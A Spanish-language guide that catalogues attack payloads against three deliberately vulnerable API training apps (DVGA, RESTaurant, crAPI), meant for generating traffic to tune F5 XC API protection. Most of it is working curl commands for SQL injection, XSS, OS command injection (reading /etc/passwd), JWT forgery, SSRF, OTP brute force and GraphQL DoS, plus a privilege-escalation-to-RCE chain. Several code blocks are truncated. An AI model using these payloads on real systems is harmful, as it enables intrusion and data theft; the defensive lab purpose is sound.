## Descripción General

Esta guía cataloga cada endpoint de API, vulnerabilidad intencional y payload de ataque en las tres aplicaciones de pruebas de seguridad de API. Úsela para construir patrones de generación de tráfico para el desarrollo de perfiles de protección de API en F5 XC.

| Aplicación | Protocolo | Ruta | Puerto | Autenticación | Vulnerabilidades |
|---|---|---|---|---|---|
| **DVGA** | GraphQL | `/dvga/` | 80 | Ninguna (admin: admin/password) | 25 escenarios |
| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (codificado en formulario) | 7 categorías OWASP API 2023 |
| **crAPI** | REST (microservicios) | `/` | 8888 | JWT (Bearer) | 18+ desafíos |

### Variables de Entorno

```bash
ORIGIN="http://<ORIGIN_IP>"
CRAPI="http://<ORIGIN_IP>:8888"
```

## DVGA (Damn Vulnerable GraphQL Application)

**Endpoint GraphQL:** `POST ${ORIGIN}/dvga/graphql`
**IDE GraphiQL:** `GET ${ORIGIN}/dvga/`
**Credenciales de Admin:** admin / password

Todas las interacciones con DVGA utilizan un único endpoint (`/dvga/graphql`) con solicitudes POST que contienen payloads JSON `{"query":"..."}`.

### Descripción General del Esquema

```
Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
Mutations: createPaste, importPaste, uploadPaste
Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
          OwnerObject (id, username, pastes)  ← referencia circular
```

### Referencia de Endpoints

| Operación | Tipo | Auth | Propósito |
|---|---|---|---|
| `pastes(public, filter, limit)` | Query | No | Listar pastes (inyección SQL vía filter) |
| `paste(id)` | Query | No | Obtener un paste individual |
| `me(token)` | Query | No | Obtener usuario por JWT (vulnerable a falsificación) |
| `systemHealth` | Query | No | Verificación de estado |
| `systemUpdate` | Query | No | Consulta lenta (~82s, vector de DoS) |
| `systemDiagnostics(cmd)` | Query | admin/password | Ejecutar comandos OS en lista blanca |
| `createPaste(title, content, public)` | Mutation | No | Crear paste (XSS vía content) |
| `importPaste(host, port, path, scheme)` | Mutation | No | Importar paste remoto (SSRF, inyección de comandos) |
| `uploadPaste(filename, content)` | Mutation | No | Subir paste (traversal de rutas) |

### Catálogo de Vulnerabilidades

#### 1. Denegación de Servicio (6 escenarios)

**Ataque de Consultas en Lote:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
```

**Recursión Profunda (referencias circulares Owner/Paste):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
```

**Consulta de Uso Intensivo de Recursos (respuesta de ~82 segundos):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemUpdate}"}'
```

**Duplicación de Campos (repetir campo 500+ veces):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
```

**Ataque Basado en Alias (1000 operaciones con alias):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{q0:systemUpdate q1:systemUpdate q2:systemUpdate q3:systemUpdate q4:systemUpdate q5:systemUpdate q6:systemUpdate q7:systemUpdate q8:systemUpdate q9:systemUpdate}"}'
```

#### 2. Divulgación de Información (5 escenarios)

**Introspección (enumeración completa del esquema):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
```

**Sugerencias de Campos (un error tipográfico revela campos válidos):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{titl}}"}'
```

**SSRF vía importPaste (sondeo de servicios internos):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
```

#### 3. Inyección (4 escenarios)

**Inyección SQL vía parámetro filter:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
```

**XSS Almacenado vía createPaste:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
```

**Inyección en Registros (suplantación de nombre de operación):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
```

#### 4. Ejecución de Código (3 escenarios)

**Inyección de Comandos OS vía importPaste:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
```

**Comando OS vía systemDiagnostics (requiere autenticación de admin):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
```

#### 5. Evasión de Autorización (3 escenarios)

**Falsificación de Token JWT (acepta tokens sin firma):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
```

**Escritura Arbitraria de Archivos vía uploadPaste (traversal de rutas):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{uploadPaste(filename:\"../../../tmp/test.txt\",content:\"path traversal test\"){result}}"}'
```

## API RESTaurant (Damn Vulnerable RESTaurant)

**Swagger UI:** `${ORIGIN}/restaurant/docs`
**Especificación OpenAPI:** `${ORIGIN}/restaurant/openapi.json`
**Auth:** JWT vía POST codificado en formulario a `/restaurant/token`
**Roles:** Customer (por defecto), Employee, Chef (admin)

### Configuración: Registrarse y Autenticarse

```bash
# Registrar un usuario de prueba
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'

# Obtener token JWT (NOTA: codificado en formulario, no JSON)
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Bearer token: ${TOKEN}"
```

### Catálogo de Vulnerabilidades

#### API1:2023 — Autorización a Nivel de Objeto Rota (BOLA)

**Modificar el perfil de otro usuario:**
```bash
curl -X PUT ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
```

**Acceder a órdenes de otros usuarios (enumerar offset):**
```bash
for i in 1 2 3 4 5; do
  curl -sf ${ORIGIN}/restaurant/orders/${i} \
    -H "Authorization: Bearer ${TOKEN}" 2>&1
  echo ""
done
```

#### API2:2023 — Autenticación Rota

**Fuerza bruta del secreto débil JWT (el secreto es de 6 dígitos: 97952):**
```bash
# Decodificar y falsificar tokens en jwt.io
# Secreto: 97952 (atacable por fuerza bruta con hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')

# Falsificar un token de Chef:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# Firmar con secreto: 97952
```

#### API3:2023 — Autorización a Nivel de Propiedad de Objeto Rota (BOPLA)

**Asignación masiva de rol de Customer a Chef:**
```bash
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

**Ruta de escalación: Customer → Employee → Chef:**
```bash
# Paso 1: Escalar a Employee
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Employee"}'

# Paso 2: Escalar a Chef
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

#### API5:2023 — Autorización a Nivel de Función Rota (BFLA)

**Eliminar elemento del menú como Customer (debería requerir Employee+):**
```bash
curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
  -H "Authorization: Bearer ${TOKEN}"
```

**Cambiar el rol de otro usuario:**
```bash
curl -X PUT ${ORIGIN}/restaurant/users/update_role \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","role":"Customer"}'
```

#### API7:2023 — Falsificación de Solicitudes del Lado del Servidor (SSRF)

**Sondear endpoints internos vía image_url del menú (requiere rol Employee):**
```bash
# Primero escalar a Employee vía BOPLA, luego:
curl -X PUT ${ORIGIN}/restaurant/menu \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
```

#### API8:2023 — Inyección

**Inyección de Comandos OS vía estadísticas de disco (requiere rol Chef):**
```bash
# Después de escalar a Chef:
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
  -H "Authorization: Bearer ${TOKEN}"

curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
  -H "Authorization: Bearer ${TOKEN}"
```

### Cadena de Ataque Completa: De Customer a Root

```bash
# 1. Registrarse
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'

# 2. Obtener token
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 3. Escalar a Chef (BOPLA)
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'

# 4. Re-autenticarse para obtener token con nivel Chef
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 5. Inyección de comandos (RCE)
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
  -H "Authorization: Bearer ${TOKEN}"
```

## crAPI (OWASP Completely Ridiculous API)

**Interfaz Web:** `${CRAPI}/`
**MailHog:** `${CRAPI}/mailhog/` (captura de correos electrónicos para verificación)
**Auth:** Token JWT Bearer (RS256, vulnerable a confusión de algoritmo)
**Arquitectura:** 7 microservicios (identity, community, workshop, postgres, mongo, mailhog, web)

### Configuración: Registrarse, Verificar Correo Electrónico, Iniciar Sesión

```bash
# 1. Registrarse
curl -X POST ${CRAPI}/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'

# 2. Verificar MailHog para el correo de verificación
# Navegar a ${CRAPI}/mailhog/ o usar la API de MailHog:
curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
import sys,json
msgs = json.load(sys.stdin)['items']
for m in msgs:
    print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
"

# 3. Iniciar sesión y obtener token JWT
TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "Bearer token: ${TOKEN}"
```

### Catálogo de Desafíos

#### Desafío 1 — BOLA: Acceder a la Ubicación del Vehículo de Otro Usuario

```bash
# Obtener primero el UUID de tu vehículo
curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
  -H "Authorization: Bearer ${TOKEN}"

# Acceder al vehículo de otro usuario (reemplazar UUID)

  -H "Authorization: Bearer ${TOKEN}"
```

#### Desafío 2 — BOLA: Acceder a Reportes de Mecánicos (Sin Auth)

```bash
# Enumeración de IDs secuenciales — no se necesita token
for i in 1 2 3 4 5; do
```

#### Desafío 3 — Auth Rota: Fuerza Bruta de OTP para Restablecimiento de Contraseña

```bash
# Solicitar OTP para la víctima
curl -X POST ${CRAPI}/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Fuerza bruta de OTP de 4 dígitos (v2 NO tiene límite de tasa)
for otp in $(seq -w 0000 9999); do
  RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"${otp}\"}" 2>&1)
  echo "$otp: $RESULT" | grep -v "Invalid OTP" && break
done
```

```bash
  -H "Content-Type: application/json" \
```


#### Desafío 14 — Acceso a Órdenes sin Autenticación

```bash
# Sin encabezado Authorization — aún retorna datos
```

#### Desafío 15 — Confusión de Algoritmo JWT

```bash
# Falsificar un JWT con algoritmo "none" (sin verificación de firma):
# 1. Establecer header: {"alg":"none","typ":"JWT"} y codificarlo en base64url
# 2. Establecer payload: {"email":"admin@example.com","role":"admin"} y codificarlo en base64url
# 3. Unir con puntos, dejar firma vacía: <header>.<payload>.
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="${HEADER}.${PAYLOAD}."

curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer ${FORGED}"
```

## Patrones de Generación de Tráfico

### Fase 1: Línea Base (Ruta Feliz)

Genere tráfico legítimo para establecer el comportamiento normal de la API antes de probar los patrones de ataque.

**Línea base de DVGA:**
```bash
# Consultas normales
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
```

**Línea base de RESTaurant:**
```bash
curl -sf ${ORIGIN}/restaurant/menu -H "Authorization: Bearer ${TOKEN}"
curl -sf ${ORIGIN}/restaurant/profile -H "Authorization: Bearer ${TOKEN}"
curl -X POST ${ORIGIN}/restaurant/orders -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"menu_item_id":1,"quantity":1}'
```

**Línea base de crAPI:**
```bash
curl -sf ${CRAPI}/identity/api/v2/user/dashboard -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
```

### Fase 2: Tráfico de Ataque por Categoría OWASP

**Pruebas de BOLA:** Enumerar IDs secuenciales, intercambiar identificadores de usuario en solicitudes, acceder a recursos sin propiedad.

**Pruebas de inyección:** Payloads SQL en parámetros de filtro/cupón, inyección de consultas GraphQL, inyección de comandos OS vía campos de parámetros.

**Pruebas de evasión de autenticación:** Falsificar tokens JWT, fuerza bruta de OTPs, usar versiones de API obsoletas, confusión de algoritmo.

**Pruebas de SSRF:** URLs internas en parámetros `importPaste`, `image_url` y `mechanic_api`.

**Pruebas de DoS:** Ataques de lotes/recursión/alias en GraphQL, `repeat_request_if_failed` con conteos altos.

### Fase 3: Cadenas de Ataque con Estado

Algunos ataques requieren secuencias de múltiples pasos con estado:

1. **Cadena de escalación de RESTaurant:** Registrarse → Token → PATCH rol a Chef → Re-autenticarse → Inyección de comandos
2. **Flujo completo de crAPI:** Registro → Verificar correo (MailHog) → Iniciar sesión → Agregar vehículo → Contactar mecánico (SSRF) → Manipulación de órdenes
3. **Reconocimiento a explotación en DVGA:** Introspección → Descubrir systemDiagnostics → Fuerza bruta de credenciales de admin → Ejecución de comandos OS

### Recomendaciones de Velocidad

| Patrón | Solicitudes/seg | Duración | Notas |
|---|---|---|---|
| Línea base (por app) | 10-50 | 5 min | Establecer huella de tráfico normal |
| Enumeración BOLA | 100-500 | 2 min | Escaneo de IDs secuenciales |
| Fuerza bruta de OTP | 1000+ | Hasta encontrar | 10,000 intentos máximo (4 dígitos) |
| DoS GraphQL | 10-50 | 30 seg | Cada solicitud es costosa del lado del servidor |
| Fuzzing de inyección | 50-200 | 5 min | Variar payloads por solicitud |
| Sondeo SSRF | 5-20 | 2 min | Lento; cada uno activa una solicitud HTTP del lado del servidor |
